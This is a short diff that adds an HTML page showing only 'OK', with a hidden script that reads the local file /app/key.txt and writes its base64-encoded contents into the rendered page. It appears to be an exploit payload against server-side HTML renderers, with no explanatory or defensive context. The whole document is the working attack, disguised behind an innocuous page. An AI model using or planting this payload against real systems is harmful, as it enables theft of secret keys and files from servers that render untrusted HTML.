@@ -1,0 +1,8 @@
+<html>
+  <h1>OK</h1>
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///app/key.txt");x.send();
+</script>
+</html>
